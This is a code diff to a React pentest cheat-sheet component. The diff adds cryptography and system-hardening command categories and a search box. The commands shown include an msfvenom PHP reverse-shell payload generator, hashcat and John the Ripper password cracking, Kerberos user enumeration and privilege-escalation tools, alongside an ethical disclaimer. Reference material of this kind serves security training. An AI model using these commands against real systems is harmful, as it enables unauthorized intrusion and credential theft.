@@ -1,5 +1,5 @@
-import React, { useState } from 'react';
-import { BookOpen, Terminal, Network, Shield, Search, ChevronRight, Copy, Check, Server, Globe, Hash, CloudLightning, Zap, Wifi, Layers, FileCode, HardDrive, Share2, Unlock, Eye, Smartphone, Radio, Cpu, Lock } from 'lucide-react';
+import React, { useState, useMemo } from 'react';
+import { BookOpen, Terminal, Network, Shield, Search, ChevronRight, Copy, Check, Server, Globe, Hash, CloudLightning, Zap, Wifi, Layers, FileCode, HardDrive, Share2, Unlock, Eye, Smartphone, Radio, Cpu, Lock, ShieldCheck, KeyRound } from 'lucide-react';
 
 interface Command {
   cmd: string;
@@ -97,7 +97,7 @@ const cheatSheetData: Category[] = [
       { cmd: 'jadx-gui <apk>', desc: 'Static analysis of APK.', mitre: 'T1082' }
     ]
   },
-  // 6. WIRELESS SECURITY (New)
+  // 6. WIRELESS SECURITY
   {
     id: 'wireless',
     name: 'Wireless Security',
@@ -142,7 +142,21 @@ const cheatSheetData: Category[] = [
       { cmd: 'msfvenom -p php/reverse_php LHOST=<ip> LPORT=<port> -f raw > shell.php', desc: 'PHP Reverse Shell.', mitre: 'T1059' }
     ]
   },
-  // 9. REVERSE ENGINEERING (New)
+  // 9. CRYPTOGRAPHY & HASHING (New)
+  {
+    id: 'crypto',
+    name: 'Cryptography',
+    icon: <KeyRound size={18} />,
+    description: 'Hashing, cracking, and certificate management.',
+    commands: [
+      { cmd: 'hashcat -m 0 -a 0 hash.txt list.txt', desc: 'Hashcat: Crack MD5.', mitre: 'T1110' },
+      { cmd: 'john --wordlist=list.txt hash.txt', desc: 'John the Ripper cracking.', mitre: 'T1110' },
+      { cmd: 'openssl x509 -in cert.pem -text -noout', desc: 'Inspect SSL Certificate.', mitre: 'T1588' },
+      { cmd: 'gpg --decrypt file.gpg', desc: 'GPG Decryption.', mitre: 'T1027' },
+      { cmd: 'base64 -d file.b64 > file.txt', desc: 'Decode Base64 file.', mitre: 'T1140' }
+    ]
+  },
+  // 10. REVERSE ENGINEERING
   {
     id: 'reverse',
     name: 'Reverse Engineering',
@@ -158,7 +172,7 @@ const cheatSheetData: Category[] = [
       { cmd: 'gdb -q <binary>', desc: 'GNU Debugger.', mitre: 'T1082' }
     ]
   },
-  // 10. PRIV ESCALATION (LINUX)
+  // 11. PRIV ESCALATION (LINUX)
   {
     id: 'privesc_linux',
     name: 'PrivEsc (Linux)',
@@ -172,7 +186,7 @@ const cheatSheetData: Category[] = [
       { cmd: 'linpeas.sh', desc: 'Automated Enumeration Script.', mitre: 'T1082' }
     ]
   },
-  // 11. PRIV ESCALATION (WINDOWS)
+  // 12. PRIV ESCALATION (WINDOWS)
   {
     id: 'privesc_windows',
     name: 'PrivEsc (Windows)',
@@ -185,7 +199,7 @@ const cheatSheetData: Category[] = [
       { cmd: 'winPEAS.exe', desc: 'Automated Enum Script.', mitre: 'T1082' }
     ]
   },
-  // 12. ACTIVE DIRECTORY
+  // 13. ACTIVE DIRECTORY
   {
     id: 'ad',
     name: 'Active Directory',
@@ -201,7 +215,7 @@ const cheatSheetData: Category[] = [
       { cmd: 'kerbrute userenum -d <domain> users.txt', desc: 'Kerberos User Enum.', mitre: 'T1589' }
     ]
   },
-  // 13. FILE TRANSFER
+  // 14. FILE TRANSFER
   {
     id: 'file_transfer',
     name: 'File Transfer',
@@ -214,7 +228,7 @@ const cheatSheetData: Category[] = [
       { cmd: 'impacket-smbserver share . -smb2support', desc: 'SMB Server.', mitre: 'T1040' }
     ]
   },
-  // 14. PIVOTING & TUNNELING
+  // 15. PIVOTING & TUNNELING
   {
     id: 'pivoting',
     name: 'Pivoting',
@@ -228,7 +242,7 @@ const cheatSheetData: Category[] = [
       { cmd: 'proxychains nmap ...', desc: 'Route tool via proxy.', mitre: 'T1090' }
     ]
   },
-  // 15. CLOUD & CONTAINER
+  // 16. CLOUD & CONTAINER
   {
     id: 'cloud',
     name: 'Cloud & Docker',
@@ -241,7 +255,21 @@ const cheatSheetData: Category[] = [
       { cmd: 'peirates', desc: 'K8s Pentest Tool.', mitre: 'T1613' }
     ]
   },
-  // 16. FORENSICS & BLUE TEAM
+  // 17. SYSTEM HARDENING (New)
+  {
+    id: 'hardening',
+    name: 'System Hardening',
+    icon: <ShieldCheck size={18} />,
+    description: 'Defensive configuration and lockdown.',
+    commands: [
+      { cmd: 'ufw allow from <ip> to any port 22', desc: 'UFW: Whitelist SSH.', mitre: 'M1037' },
+      { cmd: 'fail2ban-client status sshd', desc: 'Check Fail2Ban jail status.', mitre: 'M1037' },
+      { cmd: 'chattr +i /etc/passwd', desc: 'Make file immutable.', mitre: 'M1028' },
+      { cmd: 'auditctl -w /etc/shadow -p wa -k shadow_changes', desc: 'Audit file changes.', mitre: 'M1047' },
+      { cmd: 'sysctl -w net.ipv4.icmp_echo_ignore_all=1', desc: 'Disable ICMP Ping response.', mitre: 'M1037' }
+    ]
+  },
+  // 18. FORENSICS & BLUE TEAM
   {
     id: 'forensics',
     name: 'Forensics & Blue',
@@ -260,6 +288,7 @@ const cheatSheetData: Category[] = [
 const CheatSheetView: React.FC = () => {
   const [activeCategory, setActiveCategory] = useState<string>(cheatSheetData[0].id);
   const [copiedIndex, setCopiedIndex] = useState<string | null>(null);
+  const [searchQuery, setSearchQuery] = useState('');
 
   const activeData = cheatSheetData.find(c => c.id === activeCategory);
 
@@ -268,6 +297,20 @@ const CheatSheetView: React.FC = () => {
     setCopiedIndex(id);
     setTimeout(() => setCopiedIndex(null), 2000);
   };
+
+  // Search Logic
+  const filteredData = useMemo(() => {
+    if (!searchQuery.trim()) return null;
+    
+    const query = searchQuery.toLowerCase();
+    return cheatSheetData.map(cat => ({
+      ...cat,
+      commands: cat.commands.filter(cmd => 
+        cmd.cmd.toLowerCase().includes(query) || 
+        cmd.desc.toLowerCase().includes(query)
+      )
+    })).filter(cat => cat.commands.length > 0);
+  }, [searchQuery]);
 
   return (
     <div className="h-full flex flex-col md:flex-row p-6 max-w-7xl mx-auto w-full gap-6 overflow-hidden">
@@ -281,23 +324,40 @@ const CheatSheetView: React.FC = () => {
           </h1>
           <p className="text-slate-400 text-sm mt-1">Master Reference</p>
         </div>
+
+        {/* Search Input */}
+        <div className="px-2 mb-2">
+          <div className="relative">
+            <Search className="absolute left-3 top-2.5 text-slate-500" size={14} />
+            <input
+              type="text"
+              placeholder="Search commands..."
+              value={searchQuery}
+              onChange={(e) => setSearchQuery(e.target.value)}
+              className="w-full bg-slate-950 border border-slate-700 text-slate-200 text-xs rounded-lg pl-9 pr-3 py-2 focus:ring-1 focus:ring-emerald-500 focus:border-emerald-500 focus:outline-none transition-all"
+            />
+          </div>
+        </div>
         
-        <div className="flex flex-col gap-1">
+        <div className="flex flex-col gap-1 overflow-y-auto flex-1">
           {cheatSheetData.map(cat => (
             <button
               key={cat.id}
-              onClick={() => setActiveCategory(cat.id)}
+              onClick={() => {
+                setActiveCategory(cat.id);
+                setSearchQuery(''); // Clear search on category click
+              }}
               className={`flex items-center gap-3 p-3 rounded-lg transition-all text-sm font-medium whitespace-nowrap text-left ${
-                activeCategory === cat.id
+                activeCategory === cat.id && !searchQuery
                   ? 'bg-emerald-900/30 text-emerald-400 border border-emerald-800/50 shadow-md'
                   : 'text-slate-400 hover:bg-slate-800 hover:text-slate-200 border border-transparent'
               }`}
             >
-              <span className={activeCategory === cat.id ? 'text-emerald-400' : 'text-slate-500'}>
+              <span className={activeCategory === cat.id && !searchQuery ? 'text-emerald-400' : 'text-slate-500'}>
                 {cat.icon}
               </span>
-              <span className="flex-1">{cat.name}</span>
-              {activeCategory === cat.id && <ChevronRight size={14} className="ml-auto opacity-70" />}
+              <span className="flex-1 truncate">{cat.name}</span>
+              {activeCategory === cat.id && !searchQuery && <ChevronRight size={14} className="ml-auto opacity-70" />}
             </button>
           ))}
         </div>
@@ -311,65 +371,122 @@ const CheatSheetView: React.FC = () => {
 
       {/* Main Content */}
       <div className="flex-1 bg-slate-900 border border-slate-800 rounded-xl shadow-lg flex flex-col overflow-hidden">
-        {activeData && (
+        
+        {/* Render Search Results */}
+        {searchQuery && filteredData ? (
           <>
-            <div className="p-6 border-b border-slate-800 bg-slate-900/80 backdrop-blur-sm">
+             <div className="p-6 border-b border-slate-800 bg-slate-900/80 backdrop-blur-sm">
               <div className="flex items-center gap-3 mb-2">
                 <div className="p-2 bg-emerald-900/20 rounded-lg text-emerald-400 border border-emerald-900/30">
-                  {activeData.icon}
+                  <Search size={18} />
                 </div>
-                <h2 className="text-xl font-bold text-slate-100">{activeData.name}</h2>
+                <h2 className="text-xl font-bold text-slate-100">Search Results</h2>
               </div>
-              <p className="text-slate-400 text-sm">{activeData.description}</p>
+              <p className="text-slate-400 text-sm">Found matches for "{searchQuery}"</p>
             </div>
-
-            <div className="overflow-y-auto p-6 space-y-4">
-              {activeData.commands.map((item, idx) => {
-                const uniqueId = `${activeCategory}-${idx}`;
-                return (
-                  <div key={idx} className="group bg-slate-950/50 border border-slate-800 rounded-lg p-4 hover:border-emerald-500/30 transition-all shadow-sm hover:shadow-md">
-                    <div className="flex justify-between items-start gap-4">
-                      <div className="flex-1 font-mono text-sm text-cyan-300 break-all leading-relaxed">
-                        <span className="select-all">{item.cmd}</span>
-                      </div>
-                      <button
-                        onClick={() => handleCopy(item.cmd, uniqueId)}
-                        className={`transition-all p-2 rounded-md ${copiedIndex === uniqueId ? 'bg-emerald-900/50 text-emerald-400' : 'text-slate-500 hover:text-emerald-400 hover:bg-slate-900'}`}
-                        title="Copy command"
-                      >
-                        {copiedIndex === uniqueId ? <Check size={16} /> : <Copy size={16} />}
-                      </button>
-                    </div>
-                    <div className="mt-3 text-xs text-slate-400 border-t border-slate-800/50 pt-2 flex items-start gap-2">
-                      <Shield size={12} className="text-emerald-600 mt-0.5 flex-shrink-0" />
-                      <span className="flex-1">{item.desc}</span>
-                      {item.mitre && (
-                         <a 
-                           href={`https://attack.mitre.org/techniques/${item.mitre.replace('.','/')}`} 
-                           target="_blank" 
-                           rel="noopener noreferrer"
-                           className="flex-shrink-0 bg-slate-900 text-slate-500 hover:text-emerald-400 px-1.5 py-0.5 rounded border border-slate-800 font-mono text-[10px] transition-colors"
-                           title="View MITRE ATT&CK Technique"
-                         >
-                           {item.mitre}
-                         </a>
-                      )}
+            <div className="overflow-y-auto p-6 space-y-8">
+              {filteredData.length === 0 ? (
+                <div className="text-center text-slate-500 py-10">
+                  <p>No commands found matching your query.</p>
+                </div>
+              ) : (
+                filteredData.map(cat => (
+                  <div key={cat.id}>
+                    <h3 className="text-sm font-bold text-emerald-500 mb-3 flex items-center gap-2 uppercase tracking-wider">
+                      {cat.icon} {cat.name}
+                    </h3>
+                    <div className="space-y-4">
+                      {cat.commands.map((item, idx) => {
+                         const uniqueId = `search-${cat.id}-${idx}`;
+                         return (
+                          <div key={idx} className="group bg-slate-950/50 border border-slate-800 rounded-lg p-4 hover:border-emerald-500/30 transition-all shadow-sm">
+                            <div className="flex justify-between items-start gap-4">
+                              <div className="flex-1 font-mono text-sm text-cyan-300 break-all leading-relaxed">
+                                <span className="select-all">{item.cmd}</span>
+                              </div>
+                              <button
+                                onClick={() => handleCopy(item.cmd, uniqueId)}
+                                className={`transition-all p-2 rounded-md ${copiedIndex === uniqueId ? 'bg-emerald-900/50 text-emerald-400' : 'text-slate-500 hover:text-emerald-400 hover:bg-slate-900'}`}
+                                title="Copy command"
+                              >
+                                {copiedIndex === uniqueId ? <Check size={16} /> : <Copy size={16} />}
+                              </button>
+                            </div>
+                            <div className="mt-3 text-xs text-slate-400 border-t border-slate-800/50 pt-2 flex items-start gap-2">
+                              <Shield size={12} className="text-emerald-600 mt-0.5 flex-shrink-0" />
+                              <span className="flex-1">{item.desc}</span>
+                            </div>
+                          </div>
+                         );
+                      })}
                     </div>
                   </div>
-                );
-              })}
-              
-              <div className="mt-8 p-4 bg-slate-950 border border-red-900/30 rounded-lg flex gap-3 shadow-inner">
-                <Shield className="text-red-400/80 flex-shrink-0" size={20} />
-                <div className="text-xs text-slate-400 leading-relaxed">
-                  <strong className="text-red-400 block mb-1">ETHICAL DISCLAIMER</strong>
-                  These commands are provided strictly for educational purposes and authorized security testing. 
-                  Deploying these tools against systems without explicit permission is illegal and unethical. 
-                  Always practice in a controlled lab environment (e.g., local VMs, Hack The Box, TryHackMe).
-                </div>
-              </div>
+                ))
+              )}
             </div>
           </>
+        ) : (
+          /* Render Active Category */
+          activeData && (
+            <>
+              <div className="p-6 border-b border-slate-800 bg-slate-900/80 backdrop-blur-sm">
+                <div className="flex items-center gap-3 mb-2">
+                  <div className="p-2 bg-emerald-900/20 rounded-lg text-emerald-400 border border-emerald-900/30">
+                    {activeData.icon}
+                  </div>
+                  <h2 className="text-xl font-bold text-slate-100">{activeData.name}</h2>
+                </div>
+                <p className="text-slate-400 text-sm">{activeData.description}</p>
+              </div>
+
+              <div className="overflow-y-auto p-6 space-y-4">
+                {activeData.commands.map((item, idx) => {
+                  const uniqueId = `${activeCategory}-${idx}`;
+                  return (
+                    <div key={idx} className="group bg-slate-950/50 border border-slate-800 rounded-lg p-4 hover:border-emerald-500/30 transition-all shadow-sm hover:shadow-md">
+                      <div className="flex justify-between items-start gap-4">
+                        <div className="flex-1 font-mono text-sm text-cyan-300 break-all leading-relaxed">
+                          <span className="select-all">{item.cmd}</span>
+                        </div>
+                        <button
+                          onClick={() => handleCopy(item.cmd, uniqueId)}
+                          className={`transition-all p-2 rounded-md ${copiedIndex === uniqueId ? 'bg-emerald-900/50 text-emerald-400' : 'text-slate-500 hover:text-emerald-400 hover:bg-slate-900'}`}
+                          title="Copy command"
+                        >
+                          {copiedIndex === uniqueId ? <Check size={16} /> : <Copy size={16} />}
+                        </button>
+                      </div>
+                      <div className="mt-3 text-xs text-slate-400 border-t border-slate-800/50 pt-2 flex items-start gap-2">
+                        <Shield size={12} className="text-emerald-600 mt-0.5 flex-shrink-0" />
+                        <span className="flex-1">{item.desc}</span>
+                        {item.mitre && (
+                           <a 
+                             href={`https://attack.mitre.org/techniques/${item.mitre.replace('.','/')}`} 
+                             target="_blank" 
+                             rel="noopener noreferrer"
+                             className="flex-shrink-0 bg-slate-900 text-slate-500 hover:text-emerald-400 px-1.5 py-0.5 rounded border border-slate-800 font-mono text-[10px] transition-colors"
+                             title="View MITRE ATT&CK Technique"
+                           >
+                             {item.mitre}
+                           </a>
+                        )}
+                      </div>
+                    </div>
+                  );
+                })}
+                
+                <div className="mt-8 p-4 bg-slate-950 border border-red-900/30 rounded-lg flex gap-3 shadow-inner">
+                  <Shield className="text-red-400/80 flex-shrink-0" size={20} />
+                  <div className="text-xs text-slate-400 leading-relaxed">
+                    <strong className="text-red-400 block mb-1">ETHICAL DISCLAIMER</strong>
+                    These commands are provided strictly for educational purposes and authorized security testing. 
+                    Deploying these tools against systems without explicit permission is illegal and unethical. 
+                    Always practice in a controlled lab environment (e.g., local VMs, Hack The Box, TryHackMe).
+                  </div>
+                </div>
+              </div>
+            </>
+          )
         )}
       </div>
     </div>
